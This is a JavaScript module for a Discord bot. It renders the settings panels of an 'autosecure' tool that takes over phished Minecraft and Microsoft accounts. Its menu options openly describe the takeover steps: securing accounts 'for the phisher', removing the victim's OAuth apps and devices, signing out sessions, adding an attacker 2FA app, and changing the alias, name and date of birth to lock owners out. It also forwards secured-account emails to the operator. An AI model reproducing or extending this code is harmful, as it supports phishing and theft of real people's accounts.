const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, StringSelectMenuBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { footer, domains } = require("../../../config.json");

module.exports = async (client, username, isFeaturePanel = null) => {
    let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [username]);
    if (settings.length === 0) {
        return {
            embeds: [{
                title: "Error :x:",
                description: "Couldn't find your settings!",
                color: 0xb2c7e0
            }],
            ephemeral: true
        };
    }
    settings = settings[0];

    // --- Sync domain for all bots with user secureconfig / config.domains[0] ---
    const defaultDomain = (domains && domains[0]) ? domains[0] : 'kleomirae.fun';
    let desiredDomain = defaultDomain;

    try {
        const secureRows = await queryParams(
            'SELECT domain FROM secureconfig WHERE user_id = ?',
            [username]
        );

        const secureDomainRaw = secureRows?.[0]?.domain
            ? String(secureRows[0].domain).trim()
            : '';

        if (secureDomainRaw) {
            desiredDomain = secureDomainRaw;
        }

        // If current bot settings domain doesn't match desired, update all bots + secureconfig
        const currentDomainRaw = settings.domain ? String(settings.domain).trim() : '';
        if (currentDomainRaw !== desiredDomain) {
            await queryParams(
                'UPDATE autosecure SET domain = ? WHERE user_id = ?',
                [desiredDomain, username],
                'run'
            );
            await queryParams(
                'UPDATE secureconfig SET domain = ? WHERE user_id = ?',
                [desiredDomain, username],
                'run'
            );
            settings.domain = desiredDomain;
        }
    } catch (err) {
        console.error('[listSettings] Failed to sync securing domain:', err);
    }
const createFeaturePanel = () => {
    const row1 = new ActionRowBuilder();
    const row2 = new ActionRowBuilder();
    const row3 = new ActionRowBuilder();

    row1.addComponents(
        new ButtonBuilder()
            .setCustomId(`switchpanel|${isFeaturePanel}`)
            .setLabel(isFeaturePanel ? "Switch to Admin" : "Switch to Features")
            .setStyle(ButtonStyle.Primary)
    );

    row1.addComponents(
        new ButtonBuilder()
            .setCustomId(`showpfp|${client.username}`)
            .setLabel(`Show PFP`)
            .setStyle(ButtonStyle.Primary)
    );

/// for 3 values
const cycleValue = (val) => {
  if (val === 0) return 1
  if (val === 1) return 2
  return 0
}

const currentValue = settings.validateusername || 0
const nextValue = cycleValue(currentValue)



const descriptions = [
      'Next: Phisher denies non-mc',
    'Next: Phisher denies non-mc & non-hypixel.',
  'Next: Phisher allows all usernames.'
]

const featureMenu = new StringSelectMenuBuilder()
            .setCustomId('togglefeatures')
            .setPlaceholder('Toggle features')
            .setMaxValues(17)
            .setMinValues(1)
.addOptions([
    {
        label: `${settings.auto_secure ? 'Stop' : 'Start'} Autosecure`,
        description: 'Automatically secure accounts for the phisher',
        value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}`,
    },
    {
        label: `${settings.change_ign ? 'Stop' : 'Start'} Name Changer`,
        description: 'Adds an underscore to mc username',
        value: `settings|change_ign|${settings.change_ign ? '0' : '1'}`,
    },
    {
        label: `${settings.multiplayer ? 'Stop' : 'Start'} Multiplayer Remover`,
        description: 'Disables XBOX Multiplayer in privacy settings',
        value: `settings|multiplayer|${settings.multiplayer ? '0' : '1'}`,
    },
    {
        label: `${settings.secureifnomc ? 'Stop' : 'Start'} Securing fake accounts`,
        description: `Secure account if it doesn't own Minecraft`,
        value: `settings|secureifnomc|${settings.secureifnomc ? '0' : '1'}`,
    },
    {
        label: `${settings.checkban ? 'Stop' : 'Start'} Banchecker`,
        description: 'Check if account is banned on Hypixel during secure',
        value: `settings|checkban|${settings.checkban ? '0' : '1'}`,
    },
    {
        label: `${settings.autoquarantine ? 'Stop' : 'Start'} Auto-Quarantine`,
        description: 'Automatically add user to Hypixel Quarantine (needs proxies).',
        value: `settings|autoquarantine|${settings.autoquarantine ? '0' : '1'}`,
    },
    {
        label: `${settings.oauthapps ? 'Stop' : 'Start'} OAuth Remover`,
        description: `Remove the victim's oAuths applications`,
        value: `settings|oauthapps|${settings.oauthapps ? '0' : '1'}`,
    },
    {
        label: `${settings.exploit ? 'Stop' : 'Start'} Remove Exploit`,
        description: 'Removes Zyger Exploit',
        value: `settings|exploit|${settings.exploit ? '0' : '1'}`,
    },
    {
        label: `${settings.removedevices ? 'Stop' : 'Start'} Device Remover`,
        description: 'Remove all devices on Microsoft.',
        value: `settings|removedevices|${settings.removedevices ? '0' : '1'}`,
    },
    {
        label: `${settings.addzyger ? 'Stop' : 'Start'} 2FA Adder`,
        description: 'Adds Zyger App and Enables 2FA',
        value: `settings|addzyger|${settings.addzyger ? '0' : '1'}`,
    },
    {
        label: `${settings.signout ? 'Stop' : 'Start'} Signout Sessions`,
        description: 'Sign out all active sessions on the account',
        value: `settings|signout|${settings.signout ? '0' : '1'}`,
    },
    {
        label: `${settings.changegamertag ? 'Stop' : 'Start'} Gamertag changer`,
        description: 'Change XBOX Gamertag to prevent locks.',
        value: `settings|changegamertag|${settings.changegamertag ? '0' : '1'}`,
    },
    {
    label: `Change Phisher letting usernames pass`,
    description: descriptions[currentValue],
    value: `settings|validateusername|${nextValue}`
    },
    {
        label: `${settings.subscribemail ? 'Stop' : 'Start'} Auto-notifier for security email`,
        description: 'DMs you all emails of secured accounts',
        value: `settings|subscribemail|${settings.subscribemail ? '0' : '1'}`,
    },
    {
        label: `Primary Changer: ${settings.changeprimary === 0 ? 'Disabled' : settings.changeprimary === 1 ? '1 Change' : settings.changeprimary === 2 ? '2 Changes' : 'Disabled'}`,
        description: `Changes primary alias ${settings.changeprimary === 0 ? '(disabled)' : settings.changeprimary === 1 ? 'once' : settings.changeprimary === 2 ? 'twice' : '(disabled)'}. Cycles: 0 → 1 → 2 → 0`,
        value: `settings|changeprimary|${settings.changeprimary === 0 ? '1' : settings.changeprimary === 1 ? '2' : '0'}`,
    },
    {
        label: `${settings.changename ? 'Stop' : 'Start'} Changing Microsoft Name`,
        description: 'Change Microsoft account display name',
        value: `settings|changename|${settings.changename ? '0' : '1'}`,
    },
    {
        label: `${settings.changedob ? 'Stop' : 'Start'} Changing Microsoft DOB and Region.`,
        description: 'Customize date of birth and region for secured microsoft account.',
        value: `settings|changedob|${settings.changedob ? '0' : '1'}`,
    },
 {
        label: `${settings.changepfp ? 'Stop' : 'Start'} Changing Microsoft PFP`,
        description: 'Change Microsoft account profile picture',
        value: `settings|changepfp|${settings.changepfp ? '0' : '1'}`,
 }
]);


        row2.addComponents(featureMenu);

    row3.addComponents(
        new ButtonBuilder()
            .setCustomId('changename')
            .setLabel('Change Name')
            .setStyle(ButtonStyle.Secondary),

        new ButtonBuilder()
            .setCustomId('changedob')
            .setLabel('Change DOB & Region')
            .setStyle(ButtonStyle.Secondary),

                new ButtonBuilder()
            .setCustomId('changepfp')
            .setLabel('Change PFP')
            .setStyle(ButtonStyle.Secondary)
    );

    return [row2, row1, row3];
};


    const createAdminButtons = () => {
        const row1 = new ActionRowBuilder();
        const row2 = new ActionRowBuilder();
        const row4 = new ActionRowBuilder();
        const row5 = new ActionRowBuilder();

        row1.addComponents(
            new ButtonBuilder()
                .setCustomId("emaildomain")
                .setLabel("Domain")
                .setEmoji("📧")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId("oauthset")
                .setLabel("OAuth")
                .setEmoji("🔗")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`settingsverification|${settings.verification_type === 0 ? 1 : 0}`)
                .setLabel("Mode")
                .setEmoji("🔄")
                .setStyle(ButtonStyle.Secondary)
        );

      //  console.log(`claiming: ${JSON.stringify(settings)}`)

        row2.addComponents(
            new ButtonBuilder()
            .setCustomId(`enableclaiming|${client.botnumber}|${client.username}|${settings.claiming === 0 ? 1 : 0}`)
                .setLabel("Claiming")
                .setEmoji("💼")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`toggle_ping`)
                .setLabel("Ping")
                .setEmoji("🔔")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`users`)
                .setLabel("Users")
                .setEmoji("👥")
                .setStyle(ButtonStyle.Primary),   
        );

        let currentState = 'nothing';
        if (settings.aftersecure) {
            try {
                if (typeof settings.aftersecure === 'string' && settings.aftersecure.startsWith('{')) {
                    const parsed = JSON.parse(settings.aftersecure);
                    currentState = parsed.type;
                } else if (typeof settings.aftersecure === 'string') {
                    currentState = settings.aftersecure;
                }
            } catch (e) {
                console.error('Error parsing aftersecure state:', e);
                currentState = 'nothing';
            }
        }

        const dropdown = new StringSelectMenuBuilder()
            .setCustomId('after_secure_state')
            .setPlaceholder('Change After-Secure State')
            .addOptions([
                { label: 'After-Secure: Nothing', value: 'nothing', default: currentState === 'nothing' },
                { label: 'After-Secure: Kick', value: 'kick', default: currentState === 'kick' },
                { label: 'After-Secure: Ban', value: 'ban', default: currentState === 'ban' },
                { label: 'After-Secure: Blacklist', value: 'blacklist', default: currentState === 'blacklist' },
                { label: 'After-Secure: Blacklist Email', value: 'blacklistemail', default: currentState === 'blacklistemail' },
                { label: 'After-Secure: Role', value: 'role', default: currentState === 'role' },
                { label: 'After-Secure: DM', value: 'dm', default: currentState === 'dm' }
            ]);
        row4.addComponents(dropdown);

        row5.addComponents(
            new ButtonBuilder()
                .setCustomId(`switchpanel|${isFeaturePanel}`)
                .setLabel(isFeaturePanel ? "Switch to Admin" : "Switch to Features")
                .setStyle(ButtonStyle.Primary)
        );

        return [row1, row2, row4, row5];
    };

    const createMicrosoftSettingsComponents = () => {
        const msRow1 = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('change_domain')
                    .setLabel('Change Domain')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId('dns_records')
                    .setLabel('DNS Records')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId(`showpfp|${client.username}`)
                    .setLabel('Show PFP')
                    .setStyle(ButtonStyle.Primary)
            );

        const msRow2 = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('custom_pfp')
                    .setLabel('Custom PFP')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId('custom_name')
                    .setLabel('Custom Name')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId('custom_dob_region')
                    .setLabel('Custom DOB & Region')
                    .setStyle(ButtonStyle.Primary)
            );

        const msRow3 = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`ms_settings|changepfp|${settings.changepfp ? '0' : '1'}`)
                    .setLabel('Toggle PFP Change')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`ms_settings|changename|${settings.changename ? '0' : '1'}`)
                    .setLabel('Toggle Name Change')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`ms_settings|changedob|${settings.changedob ? '0' : '1'}`)
                    .setLabel('Toggle DOB Change')
                    .setStyle(ButtonStyle.Secondary)
            );

        // Combine the last two rows into one to stay within 5 row limit
        const msRow4 = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('set_verify_message')
                    .setLabel('Set Verify Message')
                    .setStyle(ButtonStyle.Success),
                new ButtonBuilder()
                    .setCustomId('set_activity_status')
                    .setLabel('Set Activity Status')
                    .setStyle(ButtonStyle.Success),
                new ButtonBuilder()
                    .setCustomId('channel_settings')
                    .setLabel('Channel Settings')
                    .setStyle(ButtonStyle.Success)
            );

        return [msRow1, msRow2, msRow3, msRow4];
    };

    const createEmbed = async (isFeaturePanel) => {
        const embed = new EmbedBuilder()
            .setTitle(`${isFeaturePanel ? 'Autosecure Settings for ' + client.user.username : 'Admin Settings'}`)
            .setColor(0xb2c7e0)

        if (isFeaturePanel) {
            embed.addFields(
                {
                    name: "Autosecure",
                    value: `${settings.auto_secure ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Change IGN",
                    value: `${settings.change_ign ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Disable Multiplayer",
                    value: `${settings.multiplayer ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Secure non-mc",
                    value: `${settings.secureifnomc ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Bancheck",
                    value: `${settings.checkban ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Autoquarantine",
                    value: `${settings.autoquarantine ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Remove oAuths",
                    value: `${settings.oauthapps ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Remove Exploit",
                    value: `${settings.exploit ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Remove Devices",
                    value: `${settings.removedevices ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Add Zyger 2FA",
                    value: `${settings.addzyger ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Signout",
                    value: `${settings.signout ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Change Gamertag",
                    value: `${settings.changegamertag ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Validate username",
                    value: settings.validateusername === 0 ? "All" :
                        settings.validateusername === 1 ? "MC" :
                        settings.validateusername === 2 ? "MC & HYP" :
                        "Error",
                    inline: true
                },
                {
                    name: "Auto-Notifier",
                    value: `${settings.subscribemail ? "✅" : "❌"}`,
                    inline: true
                },
                {
                    name: "Change Primary",
                    value: `${settings.changeprimary === 0 ? "❌ Disabled" : settings.changeprimary === 1 ? "✅ 1 Change" : settings.changeprimary === 2 ? "✅ 2 Changes" : "❌ Disabled"}`,
                    inline: true
                },

            );
        } else {
            const securityEmailDomain = settings.domain || defaultDomain;
            const verificationMode = settings.verification_type === 0
                ? "Username + Email"
                : settings.verification_type === 1
                    ? "Username / Email"
                    : settings.verification_type === 2
                        ? "DM Mode (/responses)"
                        : "Unknown Mode";

            let pingValue = settings.ping || "None";
            let afterSecureState = "Nothing";

            if (settings.aftersecure) {
                try {
                    if (settings.aftersecure.startsWith('{')) {
                        const parsed = JSON.parse(settings.aftersecure);
                        let type = parsed.type.toLowerCase();

                        if (type === "blacklistemail") type = "blacklist email";

                        type = type.charAt(0).toUpperCase() + type.slice(1);
                        afterSecureState = `${type}${parsed.value ? ': ' + parsed.value : ''}`;
                    } else {
                        let formatted = settings.aftersecure.toLowerCase();
                        if (formatted === "blacklistemail") formatted = "blacklist email";

                        afterSecureState = formatted.charAt(0).toUpperCase() + formatted.slice(1);
                    }
                } catch (e) {
                    console.error('Error parsing aftersecure state for embed:', e);
                    afterSecureState = "Nothing";
                }
            }

            embed.addFields(
                { name: "Security Domain", value: securityEmailDomain, inline: true },
                { name: "OAuth Link", value: settings.oauth_link || "Not set", inline: true },
                { name: "Embed Mode", value: verificationMode, inline: true },
                { name: "Claiming", value: settings.claiming ? "✅" : "❌", inline: true },
                { name: "Ping", value: pingValue, inline: true },
                { name: "After-Secure State", value: afterSecureState, inline: true }
            );
        }

        return embed;
    };

    function formatDobIso(dobStr) {
  if (!dobStr) return "Generated";

  const [day, month, year, region] = dobStr.split("|");

  if (!day || !month || !year) return "Generated";

  const months = [
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December"
  ];

  const monthName = months[parseInt(month, 10) - 1] || "Unknown";

  return `${parseInt(day, 10)} ${monthName}, ${year} [${region}]`;
}


    async function createEmbed2() {
        const embed2 = new EmbedBuilder()
            .setTitle(" \n ")
            .setColor(0xb2c7e0)
            .addFields(
                {
                    name: "Change Name",
                    value: settings.changename ? "✅" : "❌",
                    inline: true
                },
                {
                    name: "Change DOB/Region",
                    value: settings.changedob ? "✅" : "❌",
                    inline: true
                },
                {
                    name: "Change PFP",
                    value: settings.changepfp ? "✅" : "❌",
                    inline: true
                },
                                {
                    name: "Custom Name",
                    value: settings.name ? settings.name.replace("|", " ") : "Generated",
                    inline: true
                },
                {
                    name: "Custom DOB/Region",
                    value: settings.dob ? formatDobIso(settings.dob) : "Generated",
                    inline: true
                },
                {
                    name: "Custom PFP",
                    value: settings.pfp && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default",
                    inline: true
                },
            );

        return embed2;
    }

    const embed = await createEmbed(isFeaturePanel);
    let components;
    let embeds = [embed];

    if (isFeaturePanel) {
        const embed2 = await createEmbed2();
        embeds.push(embed2);
        
    
        components = createFeaturePanel();
    } else {
        // For admin panel, use admin components (4 rows)
        components = createAdminButtons();
    }

    return {
        content: null,
        embeds: embeds,
        components: components,
        ephemeral: true
    };
};